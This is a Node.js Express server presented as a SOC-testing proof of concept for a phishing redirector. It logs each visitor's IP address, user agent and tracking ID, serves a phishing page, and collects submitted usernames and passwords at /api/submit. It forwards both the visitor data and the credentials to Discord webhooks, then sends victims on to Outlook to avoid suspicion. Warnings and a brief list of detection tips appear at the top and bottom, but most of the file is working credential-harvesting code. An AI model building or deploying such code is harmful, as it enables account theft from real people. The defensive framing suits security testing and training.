/**
 * WEBHOOK PHISHING REDIRECTOR - SOC TESTING ONLY
 * 
 * This script demonstrates how attackers use redirectors to track victims
 * and redirect them to phishing pages.
 * 
 * WARNING: This is for CONTROLLED SOC TESTING ONLY!
 * DO NOT use against real users or deploy in production environments!
 */

// ===============================================================
// CONFIGURATION SETTINGS - SOC teams can modify these settings
// ===============================================================

// Webhook URL for sending visitor metadata
// Change this to your controlled Discord webhook endpoint
const METADATA_WEBHOOK_URL = "https://discord.com/api/webhooks/https://discord.com/api/webhooks/channel_ID/TOKENID";

// Credentials webhook for receiving captured login data
// This is used by phishing.html to send captured credentials
const CREDENTIALS_WEBHOOK_URL = "https://discord.com/api/webhooks/https://discord.com/api/webhooks/channel_ID/TOKENID";

// Target phishing page URL (relative to server root)
const PHISHING_PAGE_URL = "/index.html";

// ===============================================================
// Server setup - Express web server configuration
// ===============================================================

const express = require('express');
const app = express();
const path = require('path');
const fs = require('fs');
const axios = require('axios');
const PORT = 3000;

// Enable JSON parsing for POST requests
app.use(express.json());

// Serve static files from the current directory
app.use(express.static(__dirname));

// ===============================================================
// Redirector endpoint - Logs visitor data and redirects to phishing page
// DEFENDER NOTE: Monitor for suspicious 302 redirects
// ===============================================================

// Hook: Main redirector logic starts here
app.get('/', async (req, res) => {
    try {
        // Extract tracking ID from query parameters
        const trackingId = req.query.id || 'unknown';
        
        // Get timestamp
        const timestamp = new Date().toISOString();
        
        // Get IP address (this gets the actual IP or forwarded IP if behind proxy)
        const ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        
        // Get User-Agent
        const userAgent = req.headers['user-agent'] || 'unknown';
        
        // Construct metadata payload
        const metadata = {
            trackingId: trackingId,
            ipAddress: ipAddress,
            userAgent: userAgent,
            timestamp: timestamp,
            referrer: req.headers.referer || 'direct',
            path: req.path
        };
        
        console.log('Visit logged:', metadata);
        
        // Hook: Webhook exfiltration begins here
        // Format metadata for Discord webhook
        const discordPayload = {
            content: "📢 **New Visitor Detected**",
            embeds: [{
                title: "Visitor Tracking Data",
                color: 15258703, // Orange color in decimal
                fields: [
                    { name: "Tracking ID", value: trackingId, inline: true },
                    { name: "IP Address", value: ipAddress, inline: true },
                    { name: "Timestamp", value: timestamp, inline: false },
                    { name: "User Agent", value: userAgent, inline: false },
                    { name: "Referrer", value: metadata.referrer, inline: true },
                    { name: "Path", value: metadata.path, inline: true }
                ],
                footer: { text: "Webhook Phishing PoC | SOC Testing Only" }
            }]
        };
        
        // Send metadata to webhook (async, don't wait for response)
        axios.post(METADATA_WEBHOOK_URL, discordPayload)
            .then(() => console.log('Metadata successfully sent to Discord webhook'))
            .catch(err => console.error('Error sending metadata to Discord webhook:', err.message));
        
        // Instead of redirecting to a different URL (which would show merged-phishing.html),
        // serve the phishing page content directly while preserving the query parameters
        const fs = require('fs');
        const phishingContent = fs.readFileSync(__dirname + PHISHING_PAGE_URL, 'utf8');
        
        // Add the tracking ID as a data attribute that our JS can read
        // This provides a backup method to access the parameters
        const modifiedContent = phishingContent.replace('<body>',
            `<body data-tracking='${JSON.stringify(metadata)}' data-tracking-id='${trackingId}'>`);
        
        // Send the content with proper content type
        res.setHeader('Content-Type', 'text/html');
        res.send(modifiedContent);
    } catch (error) {
        console.error('Error in redirector:', error);
        // Even if an error occurs, still serve the content to avoid suspicion
        const fs = require('fs');
        try {
            const phishingContent = fs.readFileSync(__dirname + PHISHING_PAGE_URL, 'utf8');
            res.setHeader('Content-Type', 'text/html');
            res.send(phishingContent);
        } catch (e) {
            res.send("<h1>Service temporarily unavailable</h1>");
        }
    }
});

// ===============================================================
// Credentials endpoint - Optional API to receive credentials from phishing page
// This provides an alternative to using the webhook directly from the phishing page
// ===============================================================

// Hook: Credential capture API endpoint
app.post('/api/submit', async (req, res) => {
    try {
        const credentials = req.body;
        
        // Add server-side information
        credentials.serverTimestamp = new Date().toISOString();
        credentials.ipAddress = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
        
        console.log('Credentials captured:', credentials);
        
        // Format credentials for Discord webhook
        const discordPayload = {
            content: "🚨 **Credentials Captured**",
            embeds: [{
                title: "Login Attempt Detected",
                color: 15548997, // Red color in decimal
                fields: [
                    { name: "Username/Email", value: credentials.username || "Not provided", inline: true },
                    { name: "Password", value: "||" + (credentials.password || "Not provided") + "||", inline: true },
                    { name: "IP Address", value: credentials.ipAddress, inline: false },
                    { name: "User Agent", value: credentials.userAgent || "Not available", inline: false },
                    { name: "Timestamp", value: credentials.serverTimestamp, inline: false }
                ],
                footer: { text: "⚠️ SECURITY SIMULATION - SOC TESTING ONLY ⚠️" }
            }]
        };
        
        // Forward credentials to webhook
        await axios.post(CREDENTIALS_WEBHOOK_URL, discordPayload);
        
        // Return success to the phishing page
        res.json({ success: true, redirectUrl: 'https://outlook.office.com' });
    } catch (error) {
        console.error('Error handling credentials:', error);
        // Return success anyway to ensure redirection happens
        res.json({ success: true, redirectUrl: 'https://outlook.office.com' });
    }
});

// ===============================================================
// Server startup
// ===============================================================

app.listen(PORT, () => {
    console.log(`
    WARNING: SECURITY TESTING ENVIRONMENT ACTIVE
    
    Redirector server running on http://localhost:${PORT}
    
    This server is configured to:
    1. Log visitor information
    2. Send metadata to webhook: ${METADATA_WEBHOOK_URL}
    3. Redirect visitors to: ${PHISHING_PAGE_URL}
    4. Receive credentials at /api/submit
    5. Forward credentials to: ${CREDENTIALS_WEBHOOK_URL}
    
    FOR SOC TESTING PURPOSES ONLY - DO NOT USE IN PRODUCTION
    `);
});

// ===============================================================
// SOC TESTING NOTES
// ===============================================================
// 1. This simulation demonstrates how attackers use redirectors to track victims
// 2. Metadata exfiltration occurs via HTTP POST to a configurable webhook URL
// 3. The 302 redirect makes the attack less obvious to victims
// 4. Multiple webhook endpoints allow for separation of tracking and credential theft
//
// DETECTION OPPORTUNITIES:
// - Monitor for suspicious 302 redirects especially with query parameters
// - Look for outbound POST requests to webhook services from internal systems
// - Analyze user-agent correlation between initial request and subsequent navigation
//
// NEVER deploy this in production environments or against real users!
// This is for CONTROLLED SOC TESTING ONLY!
// ===============================================================